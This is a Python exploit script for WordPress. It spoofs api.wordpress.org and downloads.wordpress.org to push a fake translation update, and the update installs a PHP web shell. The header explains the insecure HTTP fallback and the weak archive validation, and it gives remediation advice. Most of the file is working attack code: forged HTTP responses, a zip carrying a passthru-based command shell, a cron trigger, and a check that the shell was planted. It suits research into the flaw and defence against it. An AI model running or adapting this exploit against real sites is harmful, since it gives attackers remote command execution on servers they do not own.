#!/usr/bin/python
############################################################
# wp-relicdrop,py
# 
# WordPress update MitM exploit which drops a crude PHP
# shell on the target server.
# 
# By default WordPress will check for updates up to every
# 60 seconds when /wp-cron.php is accessed. When it does
# so, it attempts a secure HTTPS connection to the domain:
# 
#     api.wordpress.org
# 
# If this secure HTTPS connection fails for any reason, for
# example if an invalid SSL certificate is presented by a
# MitM attacker or if a MitM attacker just doesn't have
# port 443 listening, then WordPress tries to connect over
# an insecure HTTP connection instead. Apparently people
# might be running WordPress from a server that can't make
# outbound SSL/TLS connections and, in the interests of
# security, the WordPress team want those servers to be
# capable of auto-updating too. So HTTP it is.
# 
# By stepping into the middle of a WordPress update check,
# we can tell WordPress that there's an update available
# when in fact there is not. Now, WordPress won't (by
# default) automatically update plugins, themes, or major
# core releases because of the risk of new PHP files being
# written to the server.
# 
# Translations are a different matter though. They're just
# text files, right? They're clearly safe. Well yeah,
# they're safe if they are just text files and they are
# validated properly. WordPress doesn't validate those
# files. Or it does, but not well enough.
# 
# So, we've MitM the connection from a WordPress website
# to api.wordpress.org. We use this to trick the target
# into thinking there's a translation update available.
# WordPress thinks translations are safe, so it goes to
# download the zip file from the following domain:
# 
#     downloads.wordpress.org
# 
# Guess what? If we can MitM api.wordpress.org then we can
# MitM downloads.wordpress.org too. Now we just provide our
# own zip file and WordPress will download it and extract it
# to the server, shell and all. Oops.
# 
# There's one caveat - WordPress does do some validation of
# translation archives. Yeah, they're translation archives,
# so they must contain at least one file with the extension
# .po, and one file with the extension .mo. As long as
# those files are present, it must be a valid translation
# zip file and definitely can't be dangerous...
# 
# So, yeah, that's what this does. Have fun, don't use it
# against anything you don't have permission to test.
# 
# Produced by @NickstaDB. Discovered by accident, see my
# blog at the following link for more details:
# 
#     https://nickbloor.co.uk/2018/02/28/popping-wordpress/
# 
# I wasn't the first to discover the issue, at least one
# other researcher reported this before me but the
# discoveries were independent. The issues were reported to
# WordPress but they basically took the stance of WONTFIX
# for apparent compatibility reasons.
# 
# ¯\_(ツ)_/¯
# 
# Remediation advice:
# Use appropriate whitelist filtering for outbound network
# traffic from your servers. E.g. block all outbound
# traffic except that which is absolutely necessary for the
# operation of the server and restrict necessary traffic as
# best you can. Do not allow WordPress servers to make
# outbound HTTP connections if you can help it. The MitM
# fails over HTTPS with an invalid certificate, at which
# point WordPress will attempt to make a HTTP connection
# that you should deny.
############################################################
import base64
import hashlib
import os
import requests
import socket
import StringIO
import sys
import threading
import time
import zipfile

#Globals
listen_addr = ""
target_site = ""
server_ready = False
server_shutdown = False
shell_fname = ""

#Payload data
PAYLOAD_COREVC = "\r\n".join([
	"HTTP/1.1 200 OK",
	"Server: nginx",
	"Content-Type: application/json; charset=UTF-8",
	"Connection: close",
	"Vary: Accept-Encoding",
	"Access-Control-Allow-Origin: *",
	"X-Frame-Options: SAMEORIGIN",
	"Content-Length: 13",
	"",
	"{\"offers\":[]}"
])
PAYLOAD_PLUGINUC = "\r\n".join([
	"HTTP/1.1 200 OK",
	"Server: nginx",
	"Content-Type: application/json; charset=UTF-8",
	"Connection: close",
	"Vary: Accept-Encoding",
	"Access-Control-Allow-Origin: *",
	"X-Frame-Options: SAMEORIGIN",
	"Content-Length: 260",
	"",
	"{\"plugins\":[],\"translations\":[{\"type\":\"plugin\",\"slug\":\"wp-relicdrop\",\"language\":\"en_GB\",\"version\":\"99.9\",\"updated\":\"2050-01-01 00:00:00\",\"package\":\"http://downloads.wordpress.org/translation/plugin/relic-drop/99.9/en_GB.zip\",\"autoupdate\":true}],\"no_update\":[]}"
])
LAME_PHP_SHELL = "<?php if(array_key_exists('c',$_GET)){echo '<pre>';passthru($_GET['c']);echo '</pre>';}"

#Disable SSL warnings from requests library
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

#Check command line params
print ""
if len(sys.argv) != 3:
	print "Usage: wp_relicdrop.py <listen-address> <target-wp-site>"
	print ""
	print "  E.g. wp_relicdrop.py 123.123.123.123 http://www.target.net/"
	print ""
	print "Before using this exploit, make sure the target server will resolve the"
	print "following domain names to this host:"
	print ""
	print "    api.wordpress.org"
	print "    downloads.wordpress.org"
	print ""
	print "Note: WordPress will not download updates from RFC1918 or local IPs."
	print ""
	sys.exit(0)
listen_addr = sys.argv[1]
target_site = sys.argv[2]

#Generate a filename for the uploaded PHP shell
def generateShellFilename():
	md = hashlib.sha1()
	md.update(os.urandom(64))
	return md.hexdigest() + ".php"

#Generate a HTTP response containing a zipped PHP shell with the given filename
def generatePayload(fn):
	global LAME_PHP_SHELL
	
	#Zip up the shell
	data_buffer = StringIO.StringIO()
	zip_file = zipfile.ZipFile(data_buffer, "a", zipfile.ZIP_DEFLATED, False)
	zip_file.writestr(fn, LAME_PHP_SHELL)
	zip_file.writestr("fake.po", "foo") #Translations file must contain .po and .mo files, otherwise
	zip_file.writestr("fake.mo", "foo") #WordPress won't install the translation (and shell).
	zip_file.filelist[0].create_system = 0
	zip_file.filelist[1].create_system = 0
	zip_file.filelist[2].create_system = 0
	zip_file.close()
	data_buffer.seek(0)
	zip_bytes = data_buffer.read()
	
	#Build and return a HTTP response containing the payload
	return "\r\n".join([
		"HTTP/1.1 200 OK",
		"Content-Type: application/zip",
		"Content-Length: " + str(len(zip_bytes)),
		"Connection: close",
		"Cache-control: private",
		"Content-Disposition: attachment; filename=relic-drop-99.9-en_GB.zip",
		"",
		zip_bytes
	])

#HTTP server thread
#The target site needs to connect to this host instead of (e.g. spoof DNS):
#	1) api.wordpress.org
#	2) downloads.wordpress.org
#When connections come in, this thread looks for the right requests and responds with relevant payloads
def serverThread():
	global server_shutdown, server_ready, shell_fname, PAYLOAD_COREVC, PAYLOAD_PLUGINUC
	
	#Start server socket
	print "[+] Attempting to start HTTP listener on " + listen_addr + ":80"
	try:
		server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		server_sock.settimeout(1.0)
		server_sock.bind((listen_addr, 80))
		server_sock.listen(5)
	except Exception as e:
		print "[-] Failed to start HTTP listener."
		print e
		return
	
	#Ready to go...
	print "[+] Listening for connections on " + listen_addr + ":80"
	server_ready = True
	
	#Connection handling loop
	while server_shutdown == False:
		try:
			(client_sock, client_addr) = server_sock.accept()
			print "[+] Connection received from " + client_addr[0]
			
			#Read the HTTP request from the target WordPress site
			req = client_sock.recv(4096)
			
			#Check for a core version check
			if req.startswith("POST /core/version-check/") == True:
				#Send response to trigger automatic update process
				print "  [+] Core version check request, triggering automatic updater..."
				client_sock.sendall(PAYLOAD_COREVC)
			
			#Check for a plugin update check
			if req.startswith("POST /plugins/update-check/") == True:
				#Send back details of a fake translation update
				print "  [+] Plugin update check request, triggering translation update..."
				client_sock.sendall(PAYLOAD_PLUGINUC)
			
			#Check for requests for a translation archive
			if "Host: downloads.wordpress.org" in req:
				#Generate a zip file containing a PHP shell and send it back
				print "  [+] Translation archive request, delivering zipped PHP shell..."
				shell_fname = generateShellFilename()
				client_sock.sendall(generatePayload(shell_fname))
				
				#Exploit complete, return...
				client_sock.close()
				return
			
			#Close the client socket and continue handling connections
			client_sock.close()
		except socket.timeout:
			pass

#Print status
print "wp_relicdrop.py - WordPress update MitM shell drop exploit"
print ""
print "Disclaimer: Do not use this against systems you do not have permission to test."
print ""

#Confirm DNS spoofing
print "To use this exploit, the target must resolve the following domains to this host:"
print " * api.wordpress.org"
print " * downloads.wordpress.org"
print ""
try:
	raw_input("Hit return to continue with exploitation...")
except:
	print ""
	sys.exit(0)

#Start the server thread
server_thread = threading.Thread(target=serverThread)
server_thread.start()

#Give the server thread 5 seconds to start listening
timer = time.time()
while server_ready == False and (time.time() - timer) < 5:
	pass
if server_ready == False:
	if server_thread.isAlive() == False:
		print "[-] Failed to start server thread, is another process using port 80?"
		sys.exit(1)
	else:
		print "[-] Server thread appears to have hung without exception or creating a listening socket, weird..."
		sys.exit(2)

#Issue a GET request to wp-cron.php to trigger the auto-update process
print "[+] Requesting wp-cron.php to trigger the update process..."
if target_site.endswith("/") == False:
	target_site = target_site + "/"
response = requests.get(target_site + "wp-cron.php", verify=False)
if response.status_code != 200:
	print "[-] Error: " + target_site + "wp-cron.php returned non-200 status code (" + str(response.status_code) + ")"
	server_shutdown = True
	sys.exit(3)

#Hopefully the target site is now checking for updates...
#Give the server thread 60 seconds to do its magic...
print "[+] Waiting 60s for update requests to inject shell..."
timer = time.time()
while server_thread.isAlive() == True and (time.time() - timer) < 60:
	pass

#Check if the server thread is still running
if server_thread.isAlive() == True:
	print "[-] Exploit timed out, the target may be unable to connect to this host or"
	print "    the target may have recently checked for updates. The update check won't"
	print "    run again for 60 seconds after it last ran."
	
	#Join the thread
	print "[~] Shutting down server thread"
	server_shutdown = True
	server_thread.join(60)
else:
	#Check for shell
	print "[+] Checking target for shell..."
	response = requests.get(target_site + "wp-content/languages/plugins/" + shell_fname, verify=False)
	if response.status_code != 200:
		print "[-] Exploit completed, but no shell was found on the target server. The server"
		print "    user may have insufficient permissions to write to"
		print "    /wp-content/languages/plugins."
	else:
		print "[+] Exploitation was successful, access the command shell at the following URL:"
		print "    " + target_site + "wp-content/languages/plugins/" + shell_fname
